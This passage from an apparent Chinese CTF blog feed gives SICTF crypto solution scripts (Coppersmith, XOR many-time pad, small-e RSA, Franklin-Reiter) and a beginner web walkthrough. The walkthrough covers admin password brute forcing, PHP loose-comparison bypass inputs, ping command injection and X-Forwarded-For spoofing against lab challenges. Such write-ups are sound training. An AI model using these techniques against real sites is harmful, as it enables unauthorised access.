'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n\ndef base64_decode(encoded_data):\n    decoded_data = ''\n    padding_count = encoded_data.count('=')\n    encoded_data = encoded_data.replace('=', '')\n\n    binary_str = ''\n    for char in encoded_data:\n        decimal_val = BASE64_CHARS.index(char)\n        binary_str += format(decimal_val, '06b')\n\n    if padding_count &gt; 0:\n        binary_str = binary_str[:-padding_count * 2]\n\n    for i in range(0, len(binary_str), 8):\n        byte = binary_str[i:i + 8]\n        decoded_data += chr(int(byte, 2))\n\n    return decoded_data\n\nencoded_data = input('')\ndecoded_data = base64_decode(encoded_data)\nprint(decoded_data)\n</code></pre>\n<h1 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> Pwn</h1>\n<h3 id=\"签到shop\"><a class=\"markdownIt-Anchor\" href=\"#签到shop\">#</a> [签到] Shop</h3>\n<p><img data-src=\"/img/sictfpic/15.png\" alt=\"img\"></p>\n<h1 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h3 id=\"古典大杂烩\"><a class=\"markdownIt-Anchor\" href=\"#古典大杂烩\">#</a> 古典大杂烩</h3>\n<pre><code class=\"language-PHP\">🐩👃🐪🐼👅🐯🐩👈👇👭👟👝🐺🐭👉👙👤👋👚🐪🐫👍👢👮👱🐼👢👨👠👭🐽🐰🐻👚👂👧👠👥👛👮👯👮👬🐾👐👛👌👚👞🐨👏👉👆🐿👆👘👇🐺👦🐸👃🐭👟👑👪👃👁🐻🐻👜🐧👇👊🐧🐾🐼👇🐫🐺👐👆👪🐼👋👌👧🐻👐🐩🐺👥🐽👋👉🐰👎👠👠👣🐧🐫👧🐭👢🐯👑👑🐮👂👏🐻👥👚🐮👋👬👌👥👁👣👅👧👯👦👌👌👍👠👌🐽👉👃👊🐫👉🐨🐮👩👆🐪🐯👘👏👏🐼👩👍👊👍👡👀👰👋👣👨👧👍👜👐👛🐮👘👅👠🐿👂👰👄👈👝👠👤👃👛👘🐭👅👱👆👬👫👥👆🐽👁👐👥👊👇👉👊👩👌👭🐫🐫👬👱🐯👇🐺👁👞👑👙🐮👜👋👘👪👩👚👦👨👀👩👐👉👃🐾👥👀🐫👝👍🐩🐧👰👆👇👨🐪👃🐭👦🐫👱\n</code></pre>\n<p>emjio 解密</p>\n<pre><code class=\"language-PHP\">2L3EN82QPvhfC6RbmTc34VkwzEkqivF9DcKpindwxwuGYdUcg1XROHOaPCoAL6hZsLJDDe0PS0GEP4CYOsETUpDY2CnFTR9Wiil04p6k8ZZ7KXDnc7TuUnJlNpxoUUViUFRLS4R17rO38aXXErVSVjIyTlqpVeYd7aNiHKyMQfimLda6NzOutnOFJYnSPRSrUv44uz8PCJgZb7eTasrcoqIrYRLGnI4fV20yOPq3L6o4z\n</code></pre>\n<p><img data-src=\"/img/sictfpic/16.png\" alt=\"img\"></p>\n<h3 id=\"radio\"><a class=\"markdownIt-Anchor\" href=\"#radio\">#</a> Radio</h3>\n<p><img data-src=\"/img/sictfpic/17.png\" alt=\"img\"></p>\n<h3 id=\"easy_coppersmith\"><a class=\"markdownIt-Anchor\" href=\"#easy_coppersmith\">#</a> Easy_CopperSmith</h3>\n<pre><code class=\"language-Java\">from sage.all import *\nimport binascii\nfrom Crypto.Util.number import *\n\nn =114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381\ncipher =87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810\n\ne2 = 0x10001\npbits = 512\nfor i in range(0,2**4):\n    p4=0x38481379948fa6f1dcedd12e2fb045f096e9978eccc3be2984a9ede4e6ebe1958606c590\n    p4=p4+int(hex(i),16)\n    print(hex(p4))\n    kbits = pbits - p4.nbits()  #未知需要爆破的比特位数\n    print(p4.nbits())\n    p4 = p4 &lt;&lt; kbits\n    PR.&lt;x&gt; = PolynomialRing(Zmod(n))\n    f = x + p4\n    roots = f.small_roots(X=2^kbits, beta=0.4) #进行爆破\n    #print roots\n    if roots:        #爆破成功，求根\n        p = p4+int(roots[0])\n        print(&quot;p: &quot;, hex(int(p)))\n        assert n % p == 0\n        q = n/int(p)\n        print(&quot;q: &quot;, hex(int(q)))\n        print(gcd(p,q))\n        phin = (p-1)*(q-1)\n        print(gcd(e2,phin))\n        d = inverse_mod(e2,phin)\n        print(&quot;d：&quot;,d)\n        flag = pow(cipher,d,n)\n        flag = hex(int(flag))[2:]\n        result = &quot;&quot;\n        for i in range(0, len(flag), 2):\n            hex_int = int(flag[i:i+2], 16)  # 转换为整数\n            result += chr(hex_int)  # 转换为字符并拼接到结果字符串\n        print('result :',result)\n        \n# SICTF 3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;\n</code></pre>\n<h3 id=\"mingtianpao\"><a class=\"markdownIt-Anchor\" href=\"#mingtianpao\">#</a> MingTianPao</h3>\n<pre><code class=\"language-Python\">import codecs\nimport numpy as np\n\ndef is_character(x):\n    return ord('a') &lt;= x &lt;= ord('z') or ord('A') &lt;= x &lt;= ord('Z')\n\ndef xor_strings(s1, s2):\n    return bytes([b1 ^ b2 for b1, b2 in zip(s1, s2)])\n\ndef infer_space(index, pos):\n    if message[index, pos] != 0:\n        return\n    message[index, pos] = ord(' ')\n    for x in range(len(ciphertexts)):\n        if x != index:\n            message[x][pos] = xor_strings(ciphertexts[x], ciphertexts[index])[pos] ^ ord(' ')\n\ndef find_spaces():\n    for index, x in enumerate(ciphertexts):\n        res = [xor_strings(x, y) for y in ciphertexts if x != y]\n        f = lambda position: len(list(filter(is_character, [s[position] for s in res])))\n        cnt = [f(pos) for pos in range(len(x))]\n        for pos in range(len(x)):\n            space_data.append((f(pos), index, pos))\n\nwith open('222.txt', 'r') as file:\n    ciphertexts = [codecs.decode(x.strip().encode(), 'hex') for x in file.readlines()]\n\nmessage = np.zeros([len(ciphertexts), len(ciphertexts[0])], dtype=int)\n\nspace_data = []\n\nfind_spaces()\n\nspace_data = sorted(space_data, reverse=True)\nfor weight, index, pos in space_data:\n    infer_space(index, pos)\n\nprint('\\n'.join([''.join([chr(c) for c in x]) for x in message]))\n</code></pre>\n<p>得出的结果，猜测第一行数据，异或就可以 Little Red Riding Hood promised Little Red,Rdin+ Hood ppomi4e d to obey de mo8her. Thg gr&amp;n dmother liz ou8 in the&quot;woo#s , a half hcu fr#m the vklla e . When Litxl     Re (Riding&quot;Hoo# entered thi od? a wolf&quot;cam&quot; up to her.,Se d% d not klow 0h nim-l he waq, a) d id #f him.  Goo# day to you   itt e Red Rkdin</p>\n<pre><code class=\"language-Python\">hex_str1 = &quot;1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218&quot;\nhex_str2 = &quot;Little Red Riding Hood promised&quot;\n\nbytes1 = bytes.fromhex(hex_str1)\nbytes2 = bytes(hex_str2, 'utf-8')\n\nresult = bytes([a ^ b for a, b in zip(bytes1, bytes2)])\n\nresult_str = result.decode('utf-8')\nprint(result_str)\n</code></pre>\n<h3 id=\"small_e\"><a class=\"markdownIt-Anchor\" href=\"#small_e\">#</a> small_e</h3>\n<p>低指数加密 /m 高位攻击</p>\n<p><img data-src=\"/img/sictfpic/18.png\" alt=\"img\"></p>\n<pre><code class=\"language-Python\">def phase2(high_m, n, c,e):\n    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation='NTL')\n    m = high_m + x\n    M = m((m^e - c).small_roots()[0])\n    hex_str = hex(int(M))[2:]\n    print(hex_str)\n    return hex_str\n\nn = 23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797\nc = 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181\nhigh_m = 11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592\ne = 3\n\nhex_str = phase2(high_m, n, c,e)\n# 将16进制字符串转换为整数\nint_value = Integer('0x' + hex_str)\n\n# 将整数拆分为多个字节，并转换为对应的ASCII字符\nstr_value = ''.join(chr(int(hex_str[i:i+2], 16)) for i in range(0, len(hex_str), 2))\n\nprint(str_value)\n\n</code></pre>\n<h3 id=\"签到题来咯\"><a class=\"markdownIt-Anchor\" href=\"#签到题来咯\">#</a> 签到题来咯！</h3>\n<pre><code class=\"language-Python\">import libnum\nimport binascii\nfrom  Crypto.Util.number import *\nn = 18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883\nc1 = 3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520\nc2 = 6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931\ndef is_prime(n):\n    if n &lt;= 1:\n        return False\n    if n &lt;= 3:\n        return True\n    if n % 2 == 0 or n % 3 == 0:\n        return False\n    i = 5\n    while i * i &lt;= n:\n        if n % i == 0 or n % (i + 2) == 0:\n            return False\n        i += 6\n    return True    \ndef franklinReiter(n,e,c1,c2):\n    PR.&lt;x&gt; = PolynomialRing(Zmod(n))\n    g1 = (114*x+2333)^int(e) - c1\n    g2 = (514*x+4555)^int(e) - c2\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n    return -gcd(g1, g2)[0]\n\nfor i in range(1024):\n    if is_prime(i):\n        e = i\n        m=franklinReiter(n,e,c1,c2)\n        print(long_to_bytes((int(m))))\n</code></pre>\n<h1 id=\"forensics\"><a class=\"markdownIt-Anchor\" href=\"#forensics\">#</a> Forensics</h1>\n<h3 id=\"购物之旅\"><a class=\"markdownIt-Anchor\" href=\"#购物之旅\">#</a> 购物之旅</h3>\n<p>SICTF 北京市_顺义区_新顺南大街_北京华联顺义金街购物中心}</p>\n<h3 id=\"美女姐姐\"><a class=\"markdownIt-Anchor\" href=\"#美女姐姐\">#</a> 美女姐姐</h3>\n<p>SICTF 福建省福州市仓山区烟台山公园}</p>\n<h3 id=\"宝塔镇河妖\"><a class=\"markdownIt-Anchor\" href=\"#宝塔镇河妖\">#</a> 宝塔镇河妖</h3>\n<p>SICTF 山东省济宁市汶上县太子灵踪塔}</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/08/24/web-new/",
            "url": "https://yhuanhuan01.github.io/2023/08/24/web-new/",
            "title": "web_new",
            "date_published": "2023-08-24T15:55:12.000Z",
            "content_html": "<h1 id=\"web新手\"><a class=\"markdownIt-Anchor\" href=\"#web新手\">#</a> web 新手：</h1>\n<p>攻防世界 WEB 区复现：</p>\n<h2 id=\"robots\"><a class=\"markdownIt-Anchor\" href=\"#robots\">#</a> robots:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824195924438.png\" alt=\"image-20230824195924438\"></p>\n<blockquote>\n<p>robots.txt 文件是一个文本文件，使用任何一个常见的文本编辑器，比如 Windows 系统安装了 Notepad，就可以创建和编辑它</p>\n<p>robots.txt 是一个协议，而不是一个命令。robots.txt 是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt 文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。</p>\n<p>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在 robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用 robots.txt 文件。如果您希望搜索引擎收录网站上所有内容，请勿建立 robots.txt 文件。</p>\n<p>如果将网站视为酒店里的一个房间，robots.txt 就是主人在房间门口悬挂的 “请勿打扰” 或 “欢迎打扫” 的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但 robots.txt 不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824200258007.png\" alt=\"image-20230824200258007\"></p>\n<blockquote>\n<p>拙见：Disallow 就是禁止的意思</p>\n<p>​\t\t   Allow 就是允许的意思</p>\n</blockquote>\n<p>回归该题：</p>\n<p><img data-src=\"/img/webpic/image-20230824200522350.png\" alt=\"image-20230824200522350\"></p>\n<p>当我们去访问 robots.txt 的时候，发现所有的搜索引擎不允许去访问  f1ag_1s_h3re.php 文件，说明这是敏感信息。根据提示，我们去访问这个文件。</p>\n<p><img data-src=\"/img/webpic/image-20230824201130674.png\" alt=\"image-20230824201130674\"></p>\n<p>成功获取 flag。</p>\n<h2 id=\"backup\"><a class=\"markdownIt-Anchor\" href=\"#backup\">#</a> backup:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824201515063.png\" alt=\"image-20230824201515063\"></p>\n<blockquote>\n<p>提示是去寻找备份文件</p>\n</blockquote>\n<p>打开界面：</p>\n<p><img data-src=\"/img/webpic/image-20230824201448729.png\" alt=\"\"></p>\n<blockquote>\n<p>很容易想到，这里要找 index.php 的备份文件。</p>\n<p>web 网页常见的备份文件后缀名：“.git”,“.svn”,“.swp”,“.~”,“.bak”,“.bash_history”,“.bkf”</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824201722649.png\" alt=\"image-20230824201722649\"></p>\n<p><img data-src=\"/img/webpic/image-20230824201755816.png\" alt=\"image-20230824201755816\"></p>\n<p>获取 flag。</p>\n<h2 id=\"cookie\"><a class=\"markdownIt-Anchor\" href=\"#cookie\">#</a> cookie:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824201926829.png\" alt=\"image-20230824201926829\"></p>\n<p>根据提示，cookie 里面有东西。</p>\n<p><img data-src=\"/img/webpic/image-20230824202025146.png\" alt=\"image-20230824202025146\"></p>\n<blockquote>\n<p>Cookie 是一种存储在计算机浏览器目录中的文本文件。当用户浏览某个站点并注册帐号，就会生成一个 Cookie 文件用于记录登录信息。目前，大多数网站都会应用 Cookie 技术，这既能给用户提供一个好的网络环境，又能方便收集访客信息。</p>\n<h2 id=\"cookie有哪些特性\"><a class=\"markdownIt-Anchor\" href=\"#cookie有哪些特性\">#</a> Cookie 有哪些特性:</h2>\n<p>首先，是 Cookie 的实效性。目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。</p>\n<p>其次，是 Cookie 的限制性。Cookie 必须在 HTML 文件的内容输出之前设置；不同的浏览器 (Netscape Navigator、Internet Explorer) 对 Cookie 的处理不一致，使用时一定要考虑；客户端用户如果设置禁止 Cookie，则 Cookie 不能建立。 并且在客户端，一个浏览器能创建的 Cookie 数量最多为 300 个，并且每个不能超过 4KB，每个 Web 站点能设置的 Cookie 总数不能超过 20 个。</p>\n<h2 id=\"cookie有什么作用\"><a class=\"markdownIt-Anchor\" href=\"#cookie有什么作用\">#</a> Cookie 有什么作用:</h2>\n<p>Cookie 对于网站开发者而言，从某个角度理解更像浏览器的 “缓存” 它清晰的记录你的行为指标，有利于：</p>\n<p>（1）获取精准的访客画像：用户位置、访问喜好、年龄结构、特定账号信息等。</p>\n<p>（2）广告联盟：提供更加精准的相关产品信息，这也是为什么，当你搜索某个产品以后，在各大电商网站或带有广告联盟代码的站点，经常出现同类产品的原因。</p>\n<p>（3）推进更多个性化的内容信息，延迟页面停留时间，提高转化率。</p>\n</blockquote>\n<p>这里我们采用 burp 抓一下包：</p>\n<p><img data-src=\"/img/webpic/image-20230824202352929.png\" alt=\"image-20230824202352929\"></p>\n<p>发现有一个 cookie.php, 尝试一下：</p>\n<p><img data-src=\"/img/webpic/image-20230824202455049.png\" alt=\"image-20230824202455049\"></p>\n<p>当我们传到 url 上的时候，提示我们请看 http response，所以 cookie 应该是在响应包的一个东西。</p>\n<p><img data-src=\"/img/webpic/image-20230824202815382.png\" alt=\"image-20230824202815382\"></p>\n<p>成功获取 flag。</p>\n<h2 id=\"disabled_button\"><a class=\"markdownIt-Anchor\" href=\"#disabled_button\">#</a> disabled_button:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824203157237.png\" alt=\"image-20230824203157237\"></p>\n<p>当我们打开网页：</p>\n<p><img data-src=\"/img/webpic/image-20230824203237567.png\" alt=\"image-20230824203237567\"></p>\n<p>发现此按钮不能按下去。</p>\n<p><img data-src=\"/img/webpic/image-20230824203315948.png\" alt=\"image-20230824203315948\"></p>\n<p>f12 查看源码，发现输入有上面的字段：</p>\n<blockquote>\n<p>当 input 的属性设置为 disabled=“disabled“时，表单不会提交此 input 的数据</p>\n</blockquote>\n<blockquote>\n<p>disabled：对于全部的表单元素都有效，包括 select, radio, checkbox, button 等。若是一个输入项的 disabled 设为 true，则该表单输入项不能获取焦点，用户的全部操做（鼠标点击和键盘输入等）对该输入项都无效，最重要的一点是当提交表单时，这个表单输入项将不会被提交。</p>\n<p>readonly：只针对 input (text /password) 和 textarea 有效；若是设为 true，用户只是不能编辑对应的文本，可是仍然能够聚焦焦点，而且在提交表单的时候，该输入项会做为 form 的一项提交。</p>\n</blockquote>\n<p>所以我们将其删掉就行。</p>\n<p><img data-src=\"/img/webpic/image-20230824203628188.png\" alt=\"image-20230824203628188\"></p>\n<p><img data-src=\"/img/webpic/image-20230824203644118.png\" alt=\"image-20230824203644118\"></p>\n<p>得到 flag</p>\n<h2 id=\"get_post\"><a class=\"markdownIt-Anchor\" href=\"#get_post\">#</a> get_post:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824203743132.png\" alt=\"image-20230824203743132\"></p>\n<p>两种请求方式：</p>\n<p><img data-src=\"/img/webpic/image-20230824204018624.png\" alt=\"image-20230824204018624\"></p>\n<blockquote>\n<p>GET 请求直接在 url 后，进行参数的添加。</p>\n<p>POST 请求需要借助 hackbar。</p>\n</blockquote>\n<p>另外几种请求：</p>\n<p><img data-src=\"/img/webpic/image-20230824204218269.png\" alt=\"image-20230824204218269\"></p>\n<p><img data-src=\"/img/webpic/image-20230824204233311.png\" alt=\"image-20230824204233311\"></p>\n<p><img data-src=\"/img/webpic/image-20230824204248645.png\" alt=\"image-20230824204248645\"></p>\n<p>回归题目：</p>\n<p><img data-src=\"/img/webpic/image-20230824204355681.png\" alt=\"image-20230824204355681\"></p>\n<p>得到 flag</p>\n<h2 id=\"weak_auth\"><a class=\"markdownIt-Anchor\" href=\"#weak_auth\">#</a> weak_auth:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824204503329.png\" alt=\"image-20230824204503329\"></p>\n<p>题目是个弱密码题目：</p>\n<p>可以直接猜简单密码进行登录，也可以用 burp 进行爆破。</p>\n<p><img data-src=\"/img/webpic/image-20230824204634276.png\" alt=\"image-20230824204634276\"></p>\n<p>进入网页后是这样的界面。</p>\n<p><img data-src=\"/img/webpic/image-20230824204721446.png\" alt=\"image-20230824204721446\"></p>\n<p>当我们输入用户名时，提示我们用 admin 去登录。所以这题我们只需要去爆破密码即可。</p>\n<p>当我们请求操作时，拦截下来这样的数据包。</p>\n<p><img data-src=\"/img/webpic/image-20230824204915845.png\" alt=\"image-20230824204915845\"></p>\n<p>这样去构造 payload 去进行爆破密码</p>\n<p><img data-src=\"/img/webpic/image-20230824205021958.png\" alt=\"image-20230824205021958\"></p>\n<p>加载我们的密码字典，开始攻击</p>\n<p><img data-src=\"/img/webpic/image-20230824205112705.png\" alt=\"image-20230824205112705\"></p>\n<p>从长度获知密码应为 123456</p>\n<p><img data-src=\"/img/webpic/image-20230824205327991.png\" alt=\"image-20230824205327991\"></p>\n<p>查看响应包：</p>\n<p><img data-src=\"/img/webpic/image-20230824205351133.png\" alt=\"image-20230824205351133\"></p>\n<p>得到 flag</p>\n<h2 id=\"simple_php\"><a class=\"markdownIt-Anchor\" href=\"#simple_php\">#</a> simple_php:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824205450364.png\" alt=\"image-20230824205450364\"></p>\n<p><img data-src=\"/img/webpic/image-20230824205521655.png\" alt=\"image-20230824205521655\"></p>\n<p>发现是 php 去需要判断的再能获取两个部分的 flag 的。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">==</span><span class=\"token number\">0</span> <span class=\"token keyword\">and</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>== 弱类型比较。需要了解 php 类型比较的特性。</p>\n<p><strong>PHP 类型比较</strong></p>\n<ul>\n<li>松散比较：使用两个等号 == 比较，只比较值，不比较类型。</li>\n<li>严格比较：用三个等号 === 比较，除了比较值，也比较类型。</li>\n</ul>\n<p>** 方法：**php 中的弱类型比较会使’abc’ == 0 为真，所以输入 a=abc 时，可得到 flag1</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">></span><span class=\"token number\">1234</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>is_numeric () 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE, 且 php 中弱类型比较时，会使 (‘1234a’ == 1234)</p>\n<p>** 方法：** 输入 b=1235c 即可。</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824210310021.png\" alt=\"image-20230824210310021\"></p>\n<h2 id=\"command_execution\"><a class=\"markdownIt-Anchor\" href=\"#command_execution\">#</a> command_execution:&gt;</h2>\n<blockquote>\n<p>命令执行</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824210429004.png\" alt=\"image-20230824210429004\"></p>\n<blockquote>\n<p><strong>WAF:</strong></p>\n<p>Web 应用程序防火墙（有时也简称为 WAF ）可以通过监视和过滤 Internet 与网站之间的 HTTP 通信来保护网站。</p>\n<p>一个 WAF 可以防止网站受跨站请求伪造的喜欢（被攻击 CSRF），本地文件包含（LFI），SQL 注入，跨站点脚本（XSS），等等。</p>\n<p>输入验证效果不佳的网站可能容易受到代码注入漏洞的攻击，这使攻击者试图让 SQL 语句潜行以访问未经授权的数据库。WAF 可以检测并阻止这些尝试。过时的库和软件也是易受攻击的领域，但 Web 应用程序防火墙可以用作临时解决方案，并阻止这些漏洞，并对其进行修补。</p>\n</blockquote>\n<p>题目：</p>\n<p><img data-src=\"/img/webpic/image-20230824210729558.png\" alt=\"image-20230824210729558\"></p>\n<blockquote>\n<p>ping 用于确定本地主机是否能与另一台主机成功交换 (发送与接收) 数据包，再根据返回的信息，就可以推断 TCP/IP 参数是否设置正确，以及运行是否正常、网络是否通畅等</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824211021366.png\" alt=\"image-20230824211021366\"></p>\n<p>发现有回显，这下来进行拼接，执行命令注入：</p>\n<p><img data-src=\"/img/webpic/image-20230824211133151.png\" alt=\"image-20230824211133151\"></p>\n<p>发现 ls 被执行。</p>\n<p><img data-src=\"/img/webpic/image-20230824211309540.png\" alt=\"image-20230824211309540\"></p>\n<p>找到 flag 位置</p>\n<p><img data-src=\"/img/webpic/image-20230824211410392.png\" alt=\"image-20230824211410392\"></p>\n<p>得到 flag</p>\n<h2 id=\"xff_referer\"><a class=\"markdownIt-Anchor\" href=\"#xff_referer\">#</a> xff_referer:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824211448543.png\" alt=\"image-20230824211448543\"></p>\n<p>记录一下：&gt;</p>\n<blockquote>\n<p>​\t**User-Agent：** 使得服务器能够识别客户使用的操作系统，浏览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）</p>\n<p>​\t**Cookie：** 网站为了辨别用户身份进行 session 跟踪，并储存在用户本地终端上的数据（通常经过加密）</p>\n<p>​\t <strong>X-Forwarded-For</strong>：简称 XFF 头，代表了 HTTP 的请求端真实的 IP。它被认为是客户端通过 HTTP 代理或者负载均衡器连接到 web 服务端获取源 ip 地址的一个标准（通常一些网站的防注入功能会记录请求端真实 IP 地址并写入数据库或某文件 [通过修改 XXF 头可以实现伪造 IP]）。</p>\n<p>​\t**Referer：** 浏览器向 WEB 服务器表明自己的页面来源。</p>\n<p>​\t**Host：** 客户端指定自己想访问的 WEB 服务器的域名 / IP 地址和端口号。</p>\n</blockquote>\n<blockquote>\n<p><strong>02XFF 注入的概念</strong></p>\n<p>​\tXFF，是 X-Forwarded-for 的缩写，属于 SQL 注入的一种，该注入原理是通过修改 X-Forwarded-for 头对带入系统的 dns 进行 sql 注入，达到欺骗服务器执行恶意的 SQL 命令的效果，从而可以得到网站的数据库内容。</p>\n<p><strong>03XFF 的危害</strong></p>\n<p>​\t①数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</p>\n<p>​\t②网页篡改：通过操作数据库对特定网页进行篡改。</p>\n<p>​\t③网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</p>\n<p>​\t④数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</p>\n<p>​\t⑤服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824212024008.png\" alt=\"image-20230824212024008\"></p>\n<p>题目：</p>\n<p><img data-src=\"/img/webpic/image-20230824211956203.png\" alt=\"image-20230824211956203\"></p>\n<p>提示 ip 必须 123.123.123.123，利用 xff 伪造 ip。</p>\n<p>使用 burp</p>\n<p><img data-src=\"/img/webpic/image-20230824215131470.png\" alt=\"image-20230824215131470\"></p>\n<p>进行请求伪造：</p>\n<p><img data-src=\"/img/webpic/image-20230824215155754.png\" alt=\"image-20230824215155754\"></p>\n<p>得到 flag</p>\n<h2 id=\"training-www-robots\"><a class=\"markdownIt-Anchor\" href=\"#training-www-robots\">#</a> Training-WWW-Robots:&gt;</h2>\n<blockquote>\n<p>很明显，这还是一个和 Robots 有关的题目</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824215510884.png\" alt=\"image-20230824215510884\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215659606.png\" alt=\"image-20230824215659606\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215731279.png\" alt=\"image-20230824215731279\"></p>\n<p>得到 flag</p>\n<h2 id=\"simple_js\"><a class=\"markdownIt-Anchor\" href=\"#simple_js\">#</a> simple_js:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824215817083.png\" alt=\"image-20230824215817083\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215915164.png\" alt=\"image-20230824215915164\"></p>\n<p>题目界面</p>\n<p>用 burp 抓一下包。看下响应的情况。</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">pass_enc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>    <span class=\"token comment\">// 传入的密码</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">var</span> pass <span class=\"token operator\">=</span> <span class=\"token string\">\"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 需要比对的密码  // 这是报错信息  FAUX PASSWORD HAHA</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">var</span> tab  <span class=\"token operator\">=</span> pass_enc<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span 